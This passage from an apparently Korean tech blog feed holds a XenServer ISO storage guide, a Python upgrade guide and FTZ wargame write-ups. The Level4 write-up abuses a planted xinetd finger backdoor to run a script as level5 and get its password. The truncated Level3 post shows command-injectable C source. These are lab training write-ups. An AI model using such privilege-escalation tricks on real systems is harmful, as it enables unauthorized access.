Creating journal &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;32768&lt;/span&gt; blocks&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;: &lt;span class=&quot;token keyword&quot;&gt;done&lt;/span&gt;
Writing superblocks and filesystem accounting information: &lt;span class=&quot;token keyword&quot;&gt;done&lt;/span&gt;

This filesystem will be automatically checked every &lt;span class=&quot;token number&quot;&gt;33&lt;/span&gt; mounts or
&lt;span class=&quot;token number&quot;&gt;180&lt;/span&gt; days, whichever comes first.  Use tune2fs -c or -i to override.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이런식으로 완료되게 된다.완료가 되었으면 사용할 수 있는데, 이를 사용하기 위해서는 우선 마운트를 시켜야 한다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost mnt&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# cd /mnt&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost mnt&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# mkdir -p test&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost mnt&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# mount -t ext3 /dev/VG_XenStorage-cd27bd82-61d4-1bb3-e5b6-1a1e9c57c7eb/test /mnt/test&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이렇게 마운트까지 시키게 되었다면, df를 이용하여 확인해 보자.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost mnt&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# df -h&lt;/span&gt;
Filesystem            Size  Used Avail Use% Mounted on
/dev/sda1             &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;.0G  &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;.8G  &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;.0G  &lt;span class=&quot;token number&quot;&gt;48&lt;/span&gt;% /
none                  299M  136K  298M   &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;% /dev/shm
/opt/xensource/packages/iso/XenCenter.iso
                       56M   56M     &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;% /var/xen/xc-install
/dev/mapper/VG_XenStorage--cd27bd82--61d4--1bb3--e5b6--1a1e9c57c7eb-test
                     1008G  200M  957G   &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;% /mnt/test&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;정상적으로 마운트 되었다. 이제 마지막으로 이 파티션을 XenServer의 Storage로 등록해야 한다.&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;xe sr-create&lt;/code&gt;를 이용하여 Storage를 등록한다. type=&lt;strong&gt;iso&lt;/strong&gt;이며, device-config:&lt;strong&gt;location=&lt;/strong&gt;을 통하여 경로를 지정하고, device-config:legacy_mode를 &lt;strong&gt;true&lt;/strong&gt;로 하고 content-type을 &lt;strong&gt;iso&lt;/strong&gt;로 하게되었는데, 이 옵션들의 자세한 내용은 잘 모르겠다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# xe sr-create name-label=ISOimages type=iso device-config:location=/mnt/test/ device-config:legacy_mode=true content-type=iso&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이렇게 등록을 하게되면 ISO Storage가 정상적으로 등록이 된다. XenCenter를 이용할 경우 파일을 넣은 후 Rescan을 하여야 반영이 되고, XenServer를 다시 시작할 경우, vgchange를 하여야 정상적으로 목록에 뜨게 된다.&lt;/p&gt;
&lt;p&gt;이를 자동으로 등록하기 위해서는 &lt;code class=&quot;language-text&quot;&gt;/etc/fstab&lt;/code&gt;파일에 등록하면 된다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[FTZ Level4]]></title><description><![CDATA[/etc/xinetd.d폴더를 확인해 보자. 이중 backdoor라는 파일이 의심스럽다. 살펴보면 finger서비스를 작동시킬때, level5의 권한으로 /home/level4/tmp/backdoor…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Tue, 14 Jul 2015 00:00:00 GMT</pubDate><content:encoded>&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;[level4@ftz ~]$ cat hint

누군가 /etc/xinetd.d/에 백도어를 심어놓았다.!&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;/etc/xinetd.d폴더를 확인해 보자.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level4@ftz ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token builtin class-name&quot;&gt;cd&lt;/span&gt; /etc/xinetd.d/
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level4@ftz xinetd.d&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token function&quot;&gt;ls&lt;/span&gt; -al
total &lt;span class=&quot;token number&quot;&gt;88&lt;/span&gt;
drwxr-xr-x    &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt; root     root         &lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt; Jun &lt;span class=&quot;token number&quot;&gt;29&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;14&lt;/span&gt;:53 &lt;span class=&quot;token builtin class-name&quot;&gt;.&lt;/span&gt;
drwxr-xr-x   &lt;span class=&quot;token number&quot;&gt;53&lt;/span&gt; root     root         &lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt; Jul  &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;12&lt;/span&gt;:21 &lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;
-r--r--r--    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root     level4        &lt;span class=&quot;token number&quot;&gt;171&lt;/span&gt; Sep &lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2011&lt;/span&gt; backdoor
-rw-r--r--    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root     root          &lt;span class=&quot;token number&quot;&gt;560&lt;/span&gt; Dec &lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2007&lt;/span&gt; chargen
-rw-r--r--    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root     root          &lt;span class=&quot;token number&quot;&gt;580&lt;/span&gt; Apr &lt;span class=&quot;token number&quot;&gt;17&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2003&lt;/span&gt; chargen-udp
-rw-r--r--    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root     root          &lt;span class=&quot;token number&quot;&gt;417&lt;/span&gt; Dec &lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2007&lt;/span&gt; daytime
-rw-r--r--    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root     root          &lt;span class=&quot;token number&quot;&gt;437&lt;/span&gt; Dec &lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2007&lt;/span&gt; daytime-udp
-rw-r--r--    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root     root          &lt;span class=&quot;token number&quot;&gt;339&lt;/span&gt; Dec &lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2007&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;echo&lt;/span&gt;
-rw-r--r--    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root     root          &lt;span class=&quot;token number&quot;&gt;358&lt;/span&gt; Dec &lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2007&lt;/span&gt; echo-udp
-rw-r--r--    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root     root          &lt;span class=&quot;token number&quot;&gt;317&lt;/span&gt; Dec &lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2007&lt;/span&gt; finger
-rw-r--r--    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root     root          &lt;span class=&quot;token number&quot;&gt;273&lt;/span&gt; Dec &lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2007&lt;/span&gt; ntalk
-rw-r--r--    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root     root          &lt;span class=&quot;token number&quot;&gt;359&lt;/span&gt; Dec &lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2007&lt;/span&gt; rexec
-rw-r--r--    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root     root          &lt;span class=&quot;token number&quot;&gt;376&lt;/span&gt; Dec &lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2007&lt;/span&gt; rlogin
-rw-r--r--    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root     root          &lt;span class=&quot;token number&quot;&gt;429&lt;/span&gt; Dec &lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2007&lt;/span&gt; rsh
-rw-r--r--    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root     root          &lt;span class=&quot;token number&quot;&gt;317&lt;/span&gt; Sep &lt;span class=&quot;token number&quot;&gt;29&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2004&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;rsync&lt;/span&gt;
-rw-r--r--    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root     root          &lt;span class=&quot;token number&quot;&gt;310&lt;/span&gt; Dec &lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2007&lt;/span&gt; servers
-rw-r--r--    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root     root          &lt;span class=&quot;token number&quot;&gt;312&lt;/span&gt; Dec &lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2007&lt;/span&gt; services
-rw-r--r--    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root     root          &lt;span class=&quot;token number&quot;&gt;406&lt;/span&gt; Dec &lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2007&lt;/span&gt; sgi_fam
-rw-r--r--    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root     root          &lt;span class=&quot;token number&quot;&gt;261&lt;/span&gt; Dec &lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2007&lt;/span&gt; talk
-rw-r--r--    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root     root          &lt;span class=&quot;token number&quot;&gt;305&lt;/span&gt; Sep &lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2011&lt;/span&gt; telnet
-rw-r--r--    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root     root          &lt;span class=&quot;token number&quot;&gt;495&lt;/span&gt; Dec &lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2007&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;time&lt;/span&gt;
-rw-r--r--    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root     root          &lt;span class=&quot;token number&quot;&gt;515&lt;/span&gt; Dec &lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2007&lt;/span&gt; time-udp&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이중 backdoor라는 파일이 의심스럽다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level4@ftz xinetd.d&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token function&quot;&gt;cat&lt;/span&gt; backdoor
&lt;span class=&quot;token function&quot;&gt;service&lt;/span&gt; finger
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    disable        &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; no
    flags          &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; REUSE
    socket_type    &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; stream
    &lt;span class=&quot;token function&quot;&gt;wait&lt;/span&gt;           &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; no
    user           &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; level5
    server         &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; /home/level4/tmp/backdoor
    log_on_failure &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; USERID
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;살펴보면 finger서비스를 작동시킬때, level5의 권한으로 /home/level4/tmp/backdoor파일을 실행시킨다.&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;xinetd&lt;/code&gt;은 외부에서 서비스를 실행시킬 때 데몬이 대기하고 있어야 하는데, 여러 데몬을 기다리도록 만들 경우 낭비가 심하여 그를 해결하기 위한 관리 데몬이라 생각하면 될것 같다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://lily.mmu.ac.kr/lecture/08sm/Fedora2/7jang/2.htm&quot;&gt;http://lily.mmu.ac.kr/lecture/08sm/Fedora2/7jang/2.htm&lt;/a&gt; 더 자세한 내용은 참고하면 됩니다.&lt;/p&gt;
&lt;p&gt;finger서비스를 구동시켜야 하는데, finger @localhost를 실행할 경우 finger가 외부로 요청을 보내게 됩니다.&lt;/p&gt;
&lt;p&gt;그 것을 localhost로 받기 때문에, 다시 돌아와 외부에서 실행하는 서비스로 수행하게 됩니다. 이 서비스를 level5의 권한으로 backdoor를 실행하게 됩니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level4@ftz tmp&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token builtin class-name&quot;&gt;pwd&lt;/span&gt;
/home/level4/tmp
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level4@ftz tmp&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token function&quot;&gt;ls&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level4@ftz tmp&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;tmp폴더를 확인해 보면 프로그램이 존재하지 않습니다. 직접 만들어야 합니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level4@ftz tmp&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token function&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; backdoor
&lt;span class=&quot;token comment&quot;&gt;#!/bin/bash&lt;/span&gt;
my-pass
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level4@ftz tmp&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token function&quot;&gt;chmod&lt;/span&gt; +x backdoor&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이렇게 프로그램을 작성해 줍니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level4@ftz tmp&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ finger @localhost
^&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;H^&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;J
Level5 Password is &lt;span class=&quot;token string&quot;&gt;&quot;             &quot;&lt;/span&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이렇게 서비스를 작동시켜 주게 될 경우 backdoor프로그램이 정상적으로 실행됩니다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[python 2.7 upgrade]]></title><description><![CDATA[python 업데이트를 할일이 생겨서 찾아보았다. redhat9.0 (kernel 2.4.20-8)버전 기준이다. 다른 버전도 잘 되는거 같다. python 2.2 -> python 2.7.9 참고: http://zetawiki.com/wiki…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Mon, 29 Jun 2015 16:00:00 GMT</pubDate><content:encoded>&lt;p&gt;python 업데이트를 할일이 생겨서 찾아보았다. &lt;strong&gt;redhat9.0 (kernel 2.4.20-8)&lt;/strong&gt;버전 기준이다. 다른 버전도 잘 되는거 같다.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;python 2.2 -&gt; python 2.7.9&lt;/li&gt;
&lt;li&gt;참고: &lt;a href=&quot;http://zetawiki.com/wiki/%EB%A6%AC%EB%88%85%EC%8A%A4_Python_2.7_%EC%BB%B4%ED%8C%8C%EC%9D%BC_%EC%84%A4%EC%B9%98&quot;&gt;http://zetawiki.com/wiki/리눅스_Python_2.7_컴파일_설치&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;우선 현재(2015년 6월 29일) 최신 버전인 &lt;strong&gt;2.7.9&lt;/strong&gt; 버전을 설치하도록 하겠다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.python.org/ftp/python/2.7.9/&quot;&gt;https://www.python.org/ftp/python/2.7.9/&lt;/a&gt; 에 들어가 원하는 파일을 다운로드 한다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@ftz src&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# wget https://www.python.org/ftp/python/2.7.9/Python-2.7.9.tgz&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@ftz src&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# ls -l Python-2.7.9.tgz&lt;/span&gt;
-rw-r--r--    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root     root     &lt;span class=&quot;token number&quot;&gt;16657930&lt;/span&gt; Dec &lt;span class=&quot;token number&quot;&gt;11&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2014&lt;/span&gt; Python-2.7.9.tgz&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이제 압축을 풀고 폴더에 들어간다. 폴더에 들어가 설치를 진행한다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@ftz Python-2.7.9&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# ./configure&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@ftz Python-2.7.9&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# make&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@ftz Python-2.7.9&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# make install&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;을 순서대로 실행시키면 설치가 완료된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@ftz Python-2.7.9&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# python --version&lt;/span&gt;
Python &lt;span class=&quot;token number&quot;&gt;2.7&lt;/span&gt;.9&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;정상적으로 설치가 완료되었다.&lt;/p&gt;
&lt;p&gt;그리고 yum을 실행해 보면 에러가 나는데 설명대로 해도 안되는 경우 yum을 삭제 후 재설치 하면 됐습니다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[FTZ Level3]]></title><description><![CDATA[Level3의 힌트를 보자. autodig를 사용하라고 한다. 와 을 이용하여 cmd라는 배열에 최종적으로 라는 문자열을 만들게 된다. 이 문제에서 dig는 별로 중요하지 않지만 dig…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Mon, 29 Jun 2015 08:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Level3의 힌트를 보자.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level3@ftz level3&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ cat hint
다음 코드는 autodig의 소스이다&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;

&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdlib.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;unistd.h&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; argc&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;argv&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; cmd&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; argc&lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;Auto Digger Version 0.9\n&quot;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;Usage : %s host\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;token function&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; cmd&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;dig @&quot;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;strcat&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; cmd&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;strcat&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; cmd&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot; version.bind chaos txt&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

